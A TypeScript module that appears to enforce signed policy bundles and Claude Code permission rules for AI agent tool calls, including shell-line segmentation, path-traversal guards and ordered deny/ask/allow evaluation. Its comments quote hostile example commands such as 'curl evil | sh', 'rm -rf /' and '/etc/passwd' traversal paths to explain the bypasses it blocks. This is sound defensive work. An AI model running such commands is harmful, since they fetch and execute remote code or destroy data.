/**
 * The cached policy bundle as the host uses it (spec sections 7.1 and 7.2):
 * offline signature verification against the public key delivered at
 * enrollment, Claude Code permission-rule matching, and the ordered
 * `PreToolUse` evaluation. Pure: no I/O, no clock of its own.
 *
 * Honesty note (ADR-040 section 4): a decision made here is client-attested.
 * The hook returns it to Claude Code, which honours it; nothing here prevents
 * a process that bypasses the hooks.
 */
import { createPublicKey, verify } from "node:crypto";
import { posix, win32 } from "node:path";
import { jcs, type JsonValue } from "../digest";
import { classifyTool } from "../claude-code/tools";
import type { DenyGeneration, PolicyBundle } from "../wire";
import { keyIdForPublicKey } from "./key-id";

export type PolicyDecisionValue = "allow" | "deny" | "ask" | "defer";

export interface BundleVerification {
  ok: boolean;
  reason?: string;
}

/**
 * Verify a bundle against the enrollment's public key; what the host does
 * offline. One deployment signing key signs every host's bundle, so a valid
 * signature alone does not say the bundle is this host's: another host's
 * signed observe bundle copied into `host.json` would verify. A caller that
 * knows which host it is passes `expectedHostEnrollmentId`, and a bundle
 * naming any other host is refused.
 */
export function verifyBundle(
  bundle: PolicyBundle,
  publicKeyPem: string,
  expectedHostEnrollmentId?: string,
): BundleVerification {
  const { signature, ...unsigned } = bundle;
  if (signature.alg !== "ed25519") {
    return { ok: false, reason: `unsupported alg ${signature.alg}` };
  }
  if (signature.key_id !== keyIdForPublicKey(publicKeyPem)) {
    return { ok: false, reason: "key id does not match the enrollment key" };
  }
  try {
    const ok = verify(
      null,
      Buffer.from(
        jcs(JSON.parse(JSON.stringify(unsigned)) as JsonValue),
        "utf8",
      ),
      createPublicKey(publicKeyPem),
      Buffer.from(signature.sig, "base64"),
    );
    if (!ok) return { ok, reason: "signature does not verify" };
    if (
      expectedHostEnrollmentId !== undefined &&
      bundle.host_enrollment_id !== expectedHostEnrollmentId
    ) {
      return {
        ok: false,
        reason: `bundle is for host ${bundle.host_enrollment_id}, not ${expectedHostEnrollmentId}`,
      };
    }
    return { ok };
  } catch (error) {
    return {
      ok: false,
      reason: error instanceof Error ? error.message : String(error),
    };
  }
}

// ---------------------------------------------------------------------------
// Rule matching, Claude Code permission syntax
// ---------------------------------------------------------------------------

export interface ParsedRule {
  raw: string;
  tool: string;
  spec?: string;
}

export function parseRule(raw: string): ParsedRule {
  // Trimmed first: a rule stored with a trailing space or newline otherwise
  // fails the closing-paren test and never matches anything.
  const rule = raw.trim();
  const open = rule.indexOf("(");
  if (open === -1 || !rule.endsWith(")")) return { raw, tool: rule };
  return {
    raw,
    tool: rule.slice(0, open).trim(),
    spec: rule.slice(open + 1, -1),
  };
}

function escapeRegex(value: string): string {
  return value.replace(/[.+^${}()|[\]\\]/g, "\\$&");
}

/**
 * A shell-style glob: `**` crosses separators, `*` and `?` do not.
 *
 * `**` followed by a separator is zero or more whole segments, so `**` then
 * `/.env` matches `.env` and `a/b/.env` but not `foo.env`. It compiled to a
 * bare `.*` before, which let an allow rule on one file reach every name
 * ending in it. These are the semantics of `@oxagen/glob`, written out here
 * because this package takes no `@oxagen/*` runtime dependency.
 */
export function globToRegex(glob: string, anchored = true): RegExp {
  let out = "";
  for (let i = 0; i < glob.length; i += 1) {
    const ch = glob[i];
    if (ch === "*") {
      if (glob[i + 1] === "*") {
        i += 1;
        if (glob[i + 1] === "/") {
          out += "(?:.*/)?";
          i += 1;
        } else {
          out += ".*";
        }
      } else {
        out += "[^/]*";
      }
    } else if (ch === "?") {
      out += "[^/]";
    } else {
      out += escapeRegex(ch ?? "");
    }
  }
  return new RegExp(anchored ? `^${out}$` : out);
}

/** `*` anywhere for command specs; the legacy `prefix:*` is a prefix match. */
function commandMatches(spec: string, command: string): boolean {
  if (spec.endsWith(":*")) return command.startsWith(spec.slice(0, -2));
  if (!spec.includes("*")) return command === spec;
  const pattern = spec
    .split("*")
    .map((part) => escapeRegex(part))
    .join("[\\s\\S]*");
  return new RegExp(`^${pattern}$`).test(command);
}

/**
 * The operators that end one simple command and start the next, longest
 * first so `&&` is not read as two `&`.
 */
const SHELL_OPERATORS = ["&&", "||", ";;", "|&", ";", "|", "&", "\n"];

/** Reserved words that can open a command without being the command. */
const SHELL_LEADING_WORDS = new Set([
  "!",
  "{",
  "}",
  "if",
  "then",
  "else",
  "elif",
  "fi",
  "do",
  "done",
  "while",
  "until",
  "time",
]);

function withoutLeadingWords(segment: string): string {
  let rest = segment.trim();
  for (;;) {
    const match = /^(\S+)(?:\s+|$)/.exec(rest);
    if (match === null || !SHELL_LEADING_WORDS.has(match[1] as string))
      return rest;
    rest = rest.slice(match[0].length);
  }
}

/**
 * The simple commands one shell line runs, for rule matching.
 *
 * A rule names one command, and a line can chain several: `Bash(git
 * status:*)` must not grant `git status && curl evil | sh`, and `Bash(rm
 * -rf:*)` must still refuse `true && rm -rf /`. So the line is cut at every
 * unquoted `&&`, `||`, `;`, `|`, `&` and newline, and at every subshell or
 * command substitution (`(`, `)`, `$(`, a backtick), since each of those
 * runs a command of its own. A substitution still runs inside double
 * quotes, so it is cut there too; single quotes and backslash escapes are
 * literal. `2>&1`, `&>` and `>|` are redirections, not separators.
 *
 * Deliberately not a shell parser. Where it is unsure it cuts, which makes
 * a deny or ask rule match more and an allow rule match less. Segments keep
 * their quotes, so a rule matches the text the way it did before.
 *
 * With `heredocs`, a here-document body is skipped as the data it is, so an
 * apostrophe in a commit message fed through `<<'EOF'` does not open a
 * quote that hides the `git push` after it. That reading can be wrong (a
 * `<<` inside arithmetic is a shift), and a wrong skip hides commands, so
 * it only ever adds segments for a deny or ask rule to match. An allow rule
 * reads the line without it.
 */
export function shellSegments(
  command: string,
  options: { heredocs?: boolean } = {},
): string[] {
  const segments: string[] = [];
  const stack: Array<"'" | '"' | "(" | "`"> = [];
  const pendingHeredocs: Array<{ word: string; tabs: boolean }> = [];
  let current = "";
  const cut = (): void => {
    const segment = withoutLeadingWords(current);
    // A segment of nothing but quotes (the `"` left after `"$(...)"`) runs
    // no command.
    if (/[^\s'"]/.test(segment)) segments.push(segment);
    current = "";
  };
  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i] as string;
    const top = stack.at(-1);
    if (top === "'") {
      current += ch;
      if (ch === "'") stack.pop();
      continue;
    }
    if (ch === "\\") {
      current += command.slice(i, i + 2);
      i += 1;
      continue;
    }
    if (ch === "$" && command[i + 1] === "(") {
      cut();
      stack.push("(");
      i += 1;
      continue;
    }
    if (ch === "`") {
      cut();
      if (top === "`") stack.pop();
      else stack.push("`");
      continue;
    }
    if (top === '"') {
      current += ch;
      if (ch === '"') stack.pop();
      continue;
    }
    if (ch === "'" || ch === '"') {
      current += ch;
      stack.push(ch);
      continue;
    }
    if (
      options.heredocs === true &&
      command.startsWith("<<", i) &&
      !command.startsWith("<<<", i)
    ) {
      const heredoc =
        /^<<(-?)[ \t]*(?:'([^'\n]*)'|"([^"\n]*)"|([^\s;&|<>()]+))/.exec(
          command.slice(i),
        );
      if (heredoc !== null) {
        pendingHeredocs.push({
          word:
            heredoc[2] ??
            heredoc[3] ??
            (heredoc[4] as string).replace(/["'\\]/g, ""),
          tabs: heredoc[1] === "-",
        });
        current += heredoc[0];
        i += heredoc[0].length - 1;
        continue;
      }
    }
    if (ch === "(") {
      cut();
      stack.push("(");
      continue;
    }
    if (ch === ")") {
      cut();
      if (top === "(") stack.pop();
      continue;
    }
    const prev = command[i - 1];
    const next = command[i + 1];
    const redirection =
      (ch === "&" && (prev === ">" || prev === "<" || next === ">")) ||
      (ch === "|" && prev === ">");
    const operator = redirection
      ? undefined
      : SHELL_OPERATORS.find((op) => command.startsWith(op, i));
    if (operator !== undefined) {
      cut();
      i += operator.length - 1;
      if (operator === "\n" && pendingHeredocs.length > 0) {
        i = heredocBodiesEnd(command, i + 1, pendingHeredocs) - 1;
        pendingHeredocs.length = 0;
      }
      continue;
    }
    current += ch;
  }
  cut();
  return segments;
}

/** Where the here-document bodies starting at `start` end, past each delimiter line. */
function heredocBodiesEnd(
  command: string,
  start: number,
  heredocs: ReadonlyArray<{ word: string; tabs: boolean }>,
): number {
  let at = start;
  for (const { word, tabs } of heredocs) {
    while (at < command.length) {
      const newline = command.indexOf("\n", at);
      const end = newline === -1 ? command.length : newline;
      const line = command.slice(at, end);
      at = newline === -1 ? command.length : newline + 1;
      if ((tabs ? line.replace(/^\t+/, "") : line) === word) break;
    }
  }
  return at;
}

/**
 * Whether a `Bash(...)` spec matches a shell line. A restriction (deny or
 * ask) matches when the whole line or any one command in it does; a grant
 * matches only when every command in it does.
 */
function shellCommandMatches(
  spec: string,
  command: string,
  effect: RuleEffect,
): boolean {
  const segments = shellSegments(command);
  if (effect === "allow") {
    return segments.length === 0
      ? commandMatches(spec, command)
      : segments.every((segment) => commandMatches(spec, segment));
  }
  return (
    commandMatches(spec, command) ||
    segments.some((segment) => commandMatches(spec, segment)) ||
    shellSegments(command, { heredocs: true }).some((segment) =>
      commandMatches(spec, segment),
    )
  );
}

const WINDOWS_PATH = /^(?:[A-Za-z]:[\\/]|\\\\)/;

/** A Windows path, by the platform when the caller knows it, else by shape. */
function isWindowsPath(path: string, context: MatchContext): boolean {
  return (
    context.platform === "win32" ||
    WINDOWS_PATH.test(path) ||
    (context.cwd !== undefined && WINDOWS_PATH.test(context.cwd))
  );
}

/**
 * The forms of one path a rule is tested against: resolved (so
 * `/repo/../etc/passwd` is `/etc/passwd`, and a relative path is read
 * against the cwd), relative to the cwd, and `~/`-relative to home. The raw
 * path is not a candidate, because `src/../../etc/passwd` would otherwise
 * match an allow rule written for `src/**`. A Windows path has its
 * backslashes folded to `/`, which is how rules are written.
 */
function candidatePaths(path: string, context: MatchContext): string[] {
  const windows = isWindowsPath(path, context);
  const lib = windows ? win32 : posix;
  const fold = (value: string): string =>
    windows ? value.replace(/\\/g, "/") : value;
  const { cwd, home } = context;
  const expanded =
    home !== undefined && /^~(?:[/\\]|$)/.test(path)
      ? `${home}${path.slice(1)}`
      : path;
  const resolved = fold(
    cwd !== undefined && lib.isAbsolute(cwd)
      ? lib.resolve(cwd, expanded)
      : lib.normalize(expanded),
  );
  const out = [resolved];
  const under = (root: string): string | undefined => {
    const base = fold(lib.normalize(root)).replace(/\/+$/, "");
    return resolved.startsWith(`${base}/`)
      ? resolved.slice(base.length + 1)
      : undefined;
  };
  const relative = cwd !== undefined ? under(cwd) : undefined;
  if (relative !== undefined) out.push(relative);
  const fromHome = home !== undefined ? under(home) : undefined;
  if (fromHome !== undefined) out.push(`~/${fromHome}`);
  return out;
}

function pathMatches(
  spec: string,
  path: string,
  context: MatchContext,
): boolean {
  const folded = isWindowsPath(path, context) ? spec.replace(/\\/g, "/") : spec;
  const pattern = folded.startsWith("//") ? folded.slice(1) : folded;
  const regex = globToRegex(pattern);
  return candidatePaths(path, context).some((candidate) =>
    regex.test(candidate),
  );
}

/**
 * Tool names that are the same tool under two harnesses' spellings. A
 * mandate is written once and enforced on every harness, so a rule spelled
 * `Bash(git push*)` has to reach Cursor's `Shell` (verified 2026-09-18
 * against https://cursor.com/docs/agent/hooks, fetched that day); otherwise
 * the rule quietly does not apply there and the record says allow.
 *
 * Only exact synonyms are listed. Cursor's `Write` covers both of Claude
 * Code's `Write` and `Edit`, which is not a synonym: aliasing `Edit` to it
 * would widen every `Edit(...)` allow rule over file creation too. A rule
 * meant to reach Cursor's edits is written `Write(...)`, and `Glob` has no
 * Cursor tool at all.
 */
const TOOL_SYNONYMS: Record<string, string> = { Bash: "Shell", Shell: "Bash" };

/** True for a shell tool under either spelling. */
function isShellTool(toolName: string): boolean {
  return toolName === "Bash" || toolName === "Shell";
}

/**
 * Cursor names an MCP call `MCP:<tool>` and, when its payload does not name
 * the server, the adapter leaves it that way rather than invent one. No
 * `mcp__<server>__<tool>` rule could match that name, so every MCP rule
 * missed it and the call was allowed. A restriction therefore matches on
 * the tool segment alone, as if the server were whichever one the rule
 * names (`mcp__<server>` with no tool segment names all its tools). A grant
 * never does: an unnamed server is not the one the grant was written for.
 */
function unnamedServerMcpMatches(ruleTool: string, toolName: string): boolean {
  const unnamed = /^MCP:(.+)$/.exec(toolName);
  if (unnamed === null || !ruleTool.startsWith("mcp__")) return false;
  const rest = ruleTool.slice("mcp__".length);
  const separator = rest.indexOf("__");
  const toolGlob = separator === -1 ? "*" : rest.slice(separator + 2);
  return globToRegex(toolGlob).test(unnamed[1] as string);
}

function toolNameMatches(
  ruleTool: string,
  toolName: string,
  effect: RuleEffect,
): boolean {
  if (ruleTool === toolName) return true;
  if (TOOL_SYNONYMS[ruleTool] === toolName) return true;
  if (effect !== "allow" && unnamedServerMcpMatches(ruleTool, toolName))
    return true;
  if (ruleTool.includes("*")) return globToRegex(ruleTool).test(toolName);
  // `mcp__server` matches every tool of that server.
  return (
    ruleTool.startsWith("mcp__") &&
    !ruleTool.slice("mcp__".length).includes("__") &&
    toolName.startsWith(`${ruleTool}__`)
  );
}

export interface MatchContext {
  cwd?: string;
  home?: string;
  /** Folds backslashes in paths when `win32`; a drive-letter path is folded anyway. */
  platform?: NodeJS.Platform;
}

/**
 * Which bucket a rule sits in. A grant has to cover the whole call; a
 * restriction only has to touch part of it.
 */
export type RuleEffect = "allow" | "deny" | "ask";

/**
 * Does a rule match this tool call? `effect` is the bucket the rule came
 * from, and defaults to the narrower grant reading.
 */
export function ruleMatches(
  rule: ParsedRule,
  toolName: string,
  toolInput: Record<string, unknown> | undefined,
  context: MatchContext = {},
  effect: RuleEffect = "allow",
): boolean {
  if (!toolNameMatches(rule.tool, toolName, effect)) return false;
  if (rule.spec === undefined) return true;
  const input = toolInput ?? {};
  const text = (key: string): string | undefined =>
    typeof input[key] === "string" ? (input[key] as string) : undefined;
  if (isShellTool(toolName)) {
    const command = text("command");
    return (
      command !== undefined && shellCommandMatches(rule.spec, command, effect)
    );
  }
  if (toolName === "WebFetch" || toolName === "WebSearch") {
    const url = text("url") ?? text("query");
    if (url === undefined) return false;
    if (rule.spec.startsWith("domain:")) {
      try {
        return new URL(url).hostname === rule.spec.slice("domain:".length);
      } catch {
        return false;
      }
    }
    return commandMatches(rule.spec, url);
  }
  const path =
    text("file_path") ??
    text("notebook_path") ??
    text("path") ??
    text("pattern");
  if (path !== undefined) {
    return pathMatches(rule.spec, path, context);
  }
  // A tool with no path-like member: the spec is a glob over the whole input.
  return commandMatches(rule.spec, JSON.stringify(input));
}

// ---------------------------------------------------------------------------
// Evaluation, spec section 7.2
// ---------------------------------------------------------------------------

export interface SessionControlState {
  /** Operator reason when the session is paused. */
  paused?: string | null;
  /** Operator reason when the session is cancelled. */
  cancelled?: string | null;
}

export interface EvaluationInput {
  bundle: PolicyBundle;
  /**
   * Verified before evaluation. An unverified bundle is treated as absent:
   * read-only tools are allowed and every other tool is denied, whatever mode
   * the bundle claims.
   */
  bundleVerified: boolean;
  toolName: string;
  toolInput?: Record<string, unknown>;
  hostStatus: PolicyBundle["host_status"];
  session?: SessionControlState;
  /** The newest deny generation the host has seen, from any ingest response. */
  latestDenyGeneration?: DenyGeneration;
  /** Whether the control plane answered recently; decides how staleness resolves. */
  controlReachable: boolean;
  /**
   * When the control plane last confirmed this mandate, as epoch ms. A poll
   * that answers `not_modified` is a confirmation: it says the etag in force
   * is still this one. Absent reproduces the old reading, which judged
   * freshness by `expires_at` alone.
   */
  mandateConfirmedAt?: number;
  /**
   * The mandate requires the contained tier and the launcher did not start
   * this session (ADR-152). Set by the caller, which knows the session.
   */
  containmentUnmet?: boolean;
  /**
   * The harness's own read-only claim for this tool (Stella's
   * `tool.read_only`). Honoured only when true, only where no verified
   * declaration exists and the classifier sees no write, and only to let a
   * read through: it never turns a known write into a read.
   */
  harnessReadOnly?: boolean;
  now: number;
  context?: MatchContext;
}

export interface Evaluation {
  /** What the hook answers. */
  decision: PolicyDecisionValue;
  /** What the rules said, before observe mode collapsed it to allow. */
  evaluated: PolicyDecisionValue;
  source: "bundle" | "harness" | "human";
  /** The rules that decided, joined; `tacho.session_commands.policy_rule` stores it. */
  rule?: string;
  /**
   * The same rules as a list, the source of truth (#3971). A deny or ask
   * names its one rule. An allow names the distinct rule that granted each
   * shell segment, in segment order. Present exactly when `rule` is.
   */
  rules?: string[];
  reason_code: string;
  reason: string;
  read_only: boolean;
  stale: boolean;
  risk_grade: "low" | "medium" | "high" | "critical";
  capability_id?: string;
  bundle_version: number;
  bundle_mode: PolicyBundle["mode"];
}

/**
 * Whether the cached mandate has gone stale.
 *
 * Freshness is how long since the control plane last CONFIRMED this mandate,
 * not whether `expires_at` has passed. The etag covers policy content only
 * (`unsignedBundle` in packages/handlers/src/lib/tacho-host.ts), so an
 * unchanged mandate answers `not_modified` on every poll and the host keeps
 * the bundle it has. `expires_at` sits inside the signature, so the host
 * cannot renew it. Judging by `expires_at` therefore declares a perfectly
 * healthy host stale 24 hours after the last mandate content change, and it
 * stays stale until someone edits the policy: in enforce mode that denies
 * every mutating tool call on every host in the fleet.
 *
 * The window is the bundle's own signed lifetime, `expires_at - issued_at`,
 * measured from the last confirmation. With no confirmation recorded it
 * measures from `issued_at`, which is exactly the old reading.
 */
function isStale(
  bundle: PolicyBundle,
  latest: DenyGeneration | undefined,
  now: number,
  mandateConfirmedAt?: number,
): boolean {
  const issued = Date.parse(bundle.issued_at);
  const expires = Date.parse(bundle.expires_at);
  if (Number.isFinite(issued) && Number.isFinite(expires) && expires > issued) {
    const confirmedAt = mandateConfirmedAt ?? issued;
    if (now - confirmedAt > expires - issued) return true;
  } else if (Number.isFinite(expires) && expires < now) {
    // A bundle whose timestamps do not describe a window at all keeps the
    // old reading rather than being treated as fresh for ever.
    return true;
  }
  if (latest === undefined) return false;
  return (
    latest.org > bundle.deny_generation.org ||
    latest.workspace > bundle.deny_generation.workspace
  );
}

/**
 * The etag a bundle poll should send, or `undefined` to ask for a freshly
 * signed copy.
 *
 * An unchanged mandate answers `not_modified` for as long as the etag
 * matches, so the signed copy on disk keeps its first `issued_at` and
 * `expires_at` for ever. The daemon counts each `not_modified` as a
 * confirmation, but only in memory: after a restart, or on the hook's path
 * when the daemon is down, freshness is judged from the signed window alone,
 * and a quiet mandate reads as stale a day after its last edit. So once the
 * cached copy is past half of its signed window, the poll drops the etag and
 * the control plane signs the same mandate again with a new window.
 *
 * Nothing here is a trust decision. A host that lies about its bundle's age
 * only earns a freshly signed copy of the mandate already in force.
 */
export function pollEtag(
  bundle: PolicyBundle,
  now: number,
): string | undefined {
  const issued = Date.parse(bundle.issued_at);
  const expires = Date.parse(bundle.expires_at);
  if (
    !Number.isFinite(issued) ||
    !Number.isFinite(expires) ||
    expires <= issued
  ) {
    return undefined;
  }
  return now - issued < (expires - issued) / 2 ? bundle.etag : undefined;
}

function firstMatch(
  rules: readonly string[],
  toolName: string,
  toolInput: Record<string, unknown> | undefined,
  context: MatchContext | undefined,
  effect: RuleEffect,
): string | undefined {
  for (const raw of rules) {
    if (ruleMatches(parseRule(raw), toolName, toolInput, context, effect))
      return raw;
  }
  return undefined;
}

/**
 * The allow rule, or rules, that grant this call, in the order they granted
 * it. A shell line is granted only when every command in it is, but each
 * command may be granted by a different rule, as Claude Code does:
 * `Bash(git add:*)` and `Bash(git commit:*)` together grant
 * `git add . && git commit -m x`. A rule that grants two segments is listed
 * once, at the first segment it granted.
 */
function allowMatch(
  rules: readonly string[],
  toolName: string,
  toolInput: Record<string, unknown> | undefined,
  context: MatchContext | undefined,
): string[] | undefined {
  const single = firstMatch(rules, toolName, toolInput, context, "allow");
  if (single !== undefined) return [single];
  if (!isShellTool(toolName)) return undefined;
  const command = toolInput?.["command"];
  if (typeof command !== "string") return undefined;
  const segments = shellSegments(command);
  if (segments.length < 2) return undefined;
  const used: string[] = [];
  for (const segment of segments) {
    const rule = firstMatch(
      rules,
      toolName,
      { ...toolInput, command: segment },
      context,
      "allow",
    );
    if (rule === undefined) return undefined;
    if (!used.includes(rule)) used.push(rule);
  }
  return used;
}

/** Effects the classifier names as writes; a harness read-only claim cannot undo them. */
const WRITE_EFFECTS = new Set([
  "file_write",
  "file_edit",
  "file_delete",
  "command",
  "git_commit",
  "git_push",
  "pr_open",
]);

/**
 * The ordered `PreToolUse` evaluation. Operator state (suspended, paused,
 * cancelled) applies in both modes because it is control, not policy; in
 * observe mode the rule evaluation is recorded and the answer is allow.
 */
export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
  const { bundle, toolName, toolInput } = input;
  // A tool declaration is read only from a verified bundle. An unverified one
  // could declare Bash read-only and walk it past every check below.
  const declared = !input.bundleVerified
    ? undefined
    : (bundle.tools[toolName] ??
      (TOOL_SYNONYMS[toolName] !== undefined
        ? bundle.tools[TOOL_SYNONYMS[toolName] as string]
        : undefined));
  const classified = classifyTool(toolName, toolInput);
  const harnessSaysRead =
    input.harnessReadOnly === true &&
    !WRITE_EFFECTS.has(classified.effect_kind);
  const readOnly =
    declared?.read_only ?? (!classified.tool_is_mutating || harnessSaysRead);
  const riskGrade =
    declared?.risk_grade ??
    (classified.tool_is_mutating ? ("medium" as const) : ("low" as const));
  const base = {
    read_only: readOnly,
    risk_grade: riskGrade,
    ...(declared?.capability_id !== undefined
      ? { capability_id: declared.capability_id }
      : {}),
    bundle_version: bundle.version,
    bundle_mode: bundle.mode,
    stale: false,
  };
  const deny = (
    reasonCode: string,
    reason: string,
    extra: Partial<Evaluation> = {},
  ): Evaluation => ({
    decision: "deny",
    evaluated: "deny",
    source: "bundle",
    reason_code: reasonCode,
    reason,
    ...base,
    ...extra,
  });

  // 1. Host and session status.
  if (input.hostStatus === "suspended" || input.hostStatus === "revoked") {
    return deny(
      `host_${input.hostStatus}`,
      `This host is ${input.hostStatus} by its Oxagen operator.`,
      { source: "human" },
    );
  }
  if (input.hostStatus === "paused") {
    return deny("host_paused", "This host is paused by its Oxagen operator.", {
      source: "human",
    });
  }
  if (input.session?.cancelled != null) {
    return deny(
      "session_cancelled",
      `This session was cancelled by its Oxagen operator: ${input.session.cancelled}`,
      { source: "human" },
    );
  }
  if (input.session?.paused != null) {
    return deny(
      "session_paused",
      `This session is paused by its Oxagen operator: ${input.session.paused}`,
      { source: "human" },
    );
  }

  // An unverified bundle is treated as absent, so nothing in it is believed:
  // not its `mode`, and not its `tools` declarations (dropped above). Either
  // would let whoever edited host.json decide the answer. Whether the tool
  // changes anything is read from the tool itself, and a tool that does is
  // denied whatever mode the file claims.
  if (!input.bundleVerified) {
    if (readOnly) {
      return {
        decision: "allow",
        evaluated: "defer",
        source: "bundle",
        reason_code: "bundle_unverified",
        reason:
          "The cached policy bundle did not verify; read-only tools are allowed until it refreshes.",
        ...base,
      };
    }
    return deny(
      "bundle_unverified",
      "The cached policy bundle did not verify, so tools that change anything are denied until it refreshes.",
    );
  }

  // 1b. A mandate that requires the contained tier refuses every tool in a
  // session the launcher did not start (ADR-152). Read only from a verified
  // bundle, so a forged requirement cannot deny, and a forged absence is
  // what an unverified bundle already fails closed on above.
  if (input.containmentUnmet === true && bundle.mode === "enforce") {
    return deny(
      "containment_required",
      "This agent's mandate requires the contained tier. Start it with `tacho run --contained`.",
    );
  }

  // 2. Freshness.
  const stale = isStale(
    bundle,
    input.latestDenyGeneration,
    input.now,
    input.mandateConfirmedAt,
  );
  if (stale && !readOnly) {
    if (!input.controlReachable) {
      return deny(
        "bundle_stale",
        "The policy bundle is stale and the Oxagen control plane is unreachable; only read-only tools are allowed until it refreshes.",
        { stale: true, decision: bundle.mode === "observe" ? "allow" : "deny" },
      );
    }
    return {
      decision: "defer",
      evaluated: "defer",
      source: "bundle",
      reason_code: "bundle_stale",
      reason: "The policy bundle is stale; re-evaluating against a fresh one.",
      ...base,
      stale: true,
    };
  }

  // 3. Explicit deny rules always win.
  const denied = firstMatch(
    bundle.permissions.deny,
    toolName,
    toolInput,
    input.context,
    "deny",
  );
  if (denied !== undefined) {
    return {
      decision: bundle.mode === "observe" ? "allow" : "deny",
      evaluated: "deny",
      source: "bundle",
      rule: denied,
      rules: [denied],
      reason_code: "rule_deny",
      reason: `Denied by Oxagen policy rule ${denied}.`,
      ...base,
      stale,
    };
  }

  // 4. Ask rules come before allow rules, which is Claude Code's own
  // precedence (deny, then ask, then allow). A narrow ask such as
  // `Bash(git push*)` must still ask when a broad allow such as `Bash(*)`
  // also matches; checked the other way round, the allow wins and the ask
  // rule is dead.
  const ask = firstMatch(
    bundle.permissions.ask,
    toolName,
    toolInput,
    input.context,
    "ask",
  );
  if (ask !== undefined) {
    return {
      decision: bundle.mode === "observe" ? "allow" : "ask",
      evaluated: "ask",
      source: "bundle",
      rule: ask,
      rules: [ask],
      reason_code: "rule_ask",
      reason: `Oxagen policy rule ${ask} requires a permission decision.`,
      ...base,
      stale,
    };
  }

  // 5. Allow rules.
  const allowed = allowMatch(
    bundle.permissions.allow,
    toolName,
    toolInput,
    input.context,
  );
  if (allowed !== undefined) {
    // `rule` keeps the joined form that `tacho.session_commands.policy_rule`
    // and the hook's reason have always carried; `rules` is the list.
    const rule = allowed.join(" and ");
    return {
      decision: "allow",
      evaluated: "allow",
      source: "bundle",
      rule,
      rules: allowed,
      reason_code: "rule_allow",
      reason: `Allowed by Oxagen policy rule ${rule}.`,
      ...base,
      stale,
    };
  }

  // 6. No rule: fall through to Claude Code's own flow.
  return {
    decision: bundle.mode === "observe" ? "allow" : "ask",
    evaluated: "ask",
    source: "bundle",
    reason_code: "no_rule",
    reason:
      "No Oxagen standing grant covers this tool; Claude Code's permission flow decides.",
    ...base,
    stale,
  };
}
